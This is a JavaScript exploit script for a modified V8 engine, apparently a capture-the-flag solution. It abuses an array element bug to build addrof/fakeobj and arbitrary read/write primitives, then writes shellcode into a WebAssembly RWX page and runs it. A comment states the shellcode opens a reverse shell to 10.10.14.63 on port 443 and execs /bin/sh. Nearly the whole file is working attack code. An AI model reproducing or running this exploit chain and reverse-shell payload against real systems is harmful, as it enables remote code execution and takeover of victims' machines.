var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(value)
{
    f64_buf[0] = value;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 0x20n);
}

function itof(value)
{
    u64_buf[0] = Number(value & 0xffffffffn);
    u64_buf[1] = Number(value >> 0x20n);
    return f64_buf[0];
}

var array = [1.1, 2.2, 3.3, 4.4];
var float_array_map = ftoi(array.GetLastElement());
var obj_array_map = float_array_map + 0x50n;

function addrof(in_obj)
{
    array.SetLastElement(itof(obj_array_map));
    array[0] = in_obj;
    array.SetLastElement(itof(float_array_map));
    return ftoi(array[0]) & 0xffffffffn;
}

function fakeobj(addr)
{
    array[0] = itof(addr);
    array.SetLastElement(itof(obj_array_map));
    let fake = array[0];
    array.SetLastElement(itof(float_array_map));
    return fake;
}

var array2 = [itof(float_array_map), 2.2, 3.3, 4.4];
var fake = fakeobj(addrof(array2) - 0x20n);

function read(addr)
{
    if (addr % 2n == 0)
    {
        addr += 1n;
    }

    array2[1] = itof((0x8n << 0x20n) + addr - 0x8n);
    return (fake[0]);
}

function write(addr, value)
{
    if (addr % 2n == 0)
    {
        addr += 1n;
    }

    array2[1] = itof((0x8n << 0x20n) + addr - 0x8n);
    fake[0] = itof(BigInt(value));
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var exploit = wasm_instance.exports.main;

var rwx = ftoi(read(addrof(wasm_instance) + 0x68n));

function copy(addr, shellcode)
{
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let back_store_addr = buf_addr + 0x14n;

    write(back_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++)
    {
        dataview.setUint32(i, shellcode[i], true);
    }
}

// connect(s, [2, 443, "10.10.14.63"], 16); execve("/bin/sh", NULL, NULL);
var shellcode = [0x6a, 0x29, 0x58, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x99, 0x0f, 0x05, 0x97, 0x52, 0xc7, 0x44, 0x24, 0x04, 0x0a, 0x0a, 0x0e, 0x3f, 0x66, 0xc7, 0x44, 0x24, 0x02, 0x01, 0xbb, 0xc6, 0x04, 0x24, 0x02, 0x54, 0x5e, 0xb2, 0x10, 0xb0, 0x2a, 0x0f, 0x05, 0x6a, 0x02, 0x5e, 0xb0, 0x21, 0x0f, 0x05, 0xff, 0xce, 0x79, 0xf8, 0xb0, 0x3b, 0xff, 0xc6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54, 0x5f, 0x99, 0x0f, 0x05]

copy(rwx, shellcode);
exploit();
